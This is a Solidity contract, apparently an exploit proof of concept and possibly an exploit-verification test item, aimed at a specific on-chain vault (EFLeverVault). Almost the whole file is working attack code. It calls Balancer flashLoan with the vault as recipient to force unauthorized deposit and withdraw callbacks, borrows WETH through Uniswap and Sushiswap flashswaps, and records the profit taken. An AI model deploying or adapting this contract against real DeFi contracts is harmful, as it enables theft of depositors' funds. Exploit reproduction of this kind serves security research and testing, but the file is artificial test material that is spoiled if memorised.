pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IEFLeverVault {
    function ef_token() external view returns (address);
    function balancer() external view returns (address);
    function weth() external view returns (address);
    function getDebt() external view returns (uint256);
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xe39fd820B58f83205Db1D9225f28105971c3D309;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool public attempted;
    uint256 internal _profitAmount;

    address internal _activePair;
    uint256 internal _borrowedWeth;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        uint256 wealthBefore = _totalWealthInWethTerms();
        IEFLeverVault vault = IEFLeverVault(TARGET);

        // Exploit path 0:
        // attacker calls Balancer flashLoan(recipient = vault, token = WETH, amount = chosenAmount, userData = "0x1")
        // Balancer then invokes TARGET.receiveFlashLoan(), and the vault routes that callback into _deposit().
        _attemptUnauthorizedDeposit(vault);

        uint256[7] memory seeds = [
            uint256(0.03 ether),
            0.1 ether,
            0.3 ether,
            1 ether,
            3 ether,
            10 ether,
            30 ether
        ];

        for (uint256 i = 0; i < seeds.length; i++) {
            try this._runFlashswap(seeds[i]) {
                if (_totalWealthInWethTerms() > wealthBefore) {
                    break;
                }
            } catch {}
        }

        _wrapAllEth();
        uint256 wealthAfter = _totalWealthInWethTerms();
        if (wealthAfter > wealthBefore) {
            _profitAmount = wealthAfter - wealthBefore;
        }
    }

    function _runFlashswap(uint256 seedWeth) external {
        require(msg.sender == address(this), "self only");
        require(seedWeth > 0, "zero seed");

        address pair = _locateFundingPair();
        require(pair != address(0), "no pair");

        _activePair = pair;
        _borrowedWeth = seedWeth;

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? seedWeth : 0;
        uint256 amount1Out = token0 == WETH ? 0 : seedWeth;

        // Funding only: a V2 flashswap provides temporary, pre-existing on-chain WETH.
        // The core bug remains the vault's permissionless Balancer callback.
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(seedWeth));

        _activePair = address(0);
        _borrowedWeth = 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == _activePair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 seedWeth = abi.decode(data, (uint256));
        require(borrowed == seedWeth && borrowed == _borrowedWeth, "bad borrow");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        IWETHLike(WETH).withdraw(seedWeth);
        vault.deposit{value: seedWeth}(seedWeth);

        uint256 shareBalance = efToken.balanceOf(address(this));
        require(shareBalance > 0, "no shares");

        // Exploit path 1:
        // attacker calls Balancer flashLoan(recipient = vault, token = WETH, amount <= getDebt(), userData = "0x2")
        // Balancer again invokes TARGET.receiveFlashLoan(), and the vault routes that callback into _withdraw().
        require(_attemptUnauthorizedWithdraw(vault, shareBalance), "forced unwind failed");

        uint256 repayment = _v2Repayment(seedWeth);
        _ensureWeth(repayment);
        require(IERC20Like(WETH).transfer(msg.sender, repayment), "repay failed");
    }

    function _attemptForcedDeposit(uint256 chosenAmount) external {
        require(msg.sender == address(this), "self only");
        _forceBalancerCallback(chosenAmount, bytes("0x1"));
    }

    function _attemptForcedWithdraw(uint256 chosenAmount, uint256 shareAmount) external {
        require(msg.sender == address(this), "self only");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());
        require(shareAmount > 0 && shareAmount <= efToken.balanceOf(address(this)), "bad shares");

        _forceBalancerCallback(chosenAmount, bytes("0x2"));

        require(address(TARGET).balance > 0, "no stranded eth");
        vault.withdraw(shareAmount);
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptUnauthorizedDeposit(IEFLeverVault vault) internal returns (bool) {
        uint256 chosenAmount = _chooseUnauthorizedDepositAmount(vault);
        if (chosenAmount == 0) {
            return false;
        }

        try this._attemptForcedDeposit(chosenAmount) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptUnauthorizedWithdraw(IEFLeverVault vault, uint256 shareAmount) internal returns (bool) {
        uint256 debt = vault.getDebt();
        if (debt <= 1) {
            return false;
        }

        uint256 chosenAmount = debt / 2;
        if (chosenAmount == 0 || chosenAmount >= debt) {
            chosenAmount = debt - 1;
        }
        if (chosenAmount == 0 || chosenAmount > debt) {
            return false;
        }

        try this._attemptForcedWithdraw(chosenAmount, shareAmount) {
            return true;
        } catch {
            return false;
        }
    }

    function _forceBalancerCallback(uint256 chosenAmount, bytes memory rawUserData) internal {
        IEFLeverVault vault = IEFLeverVault(TARGET);
        require(vault.weth() == WETH, "unexpected weth");
        require(chosenAmount > 0, "zero amount");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = WETH;
        amounts[0] = chosenAmount;

        // This is the reported primitive directly:
        // Balancer.flashLoan(recipient = vault, token = WETH, amount = chosenAmount, userData = "0x1" or "0x2").
        // The attacker is not the vault and does not need any special privilege.
        IBalancerVaultLike(vault.balancer()).flashLoan(TARGET, tokens, amounts, rawUserData);
    }

    function _chooseUnauthorizedDepositAmount(IEFLeverVault vault) internal view returns (uint256) {
        if (vault.weth() != WETH) {
            return 0;
        }

        uint256 debt = vault.getDebt();
        if (debt == 0) {
            return 0.01 ether;
        }

        uint256 chosenAmount = debt / 20;
        if (chosenAmount < 0.01 ether) {
            chosenAmount = 0.01 ether;
        }
        if (chosenAmount > 1 ether) {
            chosenAmount = 1 ether;
        }
        return chosenAmount;
    }

    function _locateFundingPair() internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, USDC);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, DAI);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, USDT);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, USDC);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, DAI);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, USDT);
    }

    function _ensureWeth(uint256 needed) internal {
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (wethBalance >= needed) {
            return;
        }

        uint256 shortfall = needed - wethBalance;
        require(address(this).balance >= shortfall, "insufficient eth");
        IWETHLike(WETH).deposit{value: shortfall}();
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _totalWealthInWethTerms() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _v2Repayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }
}
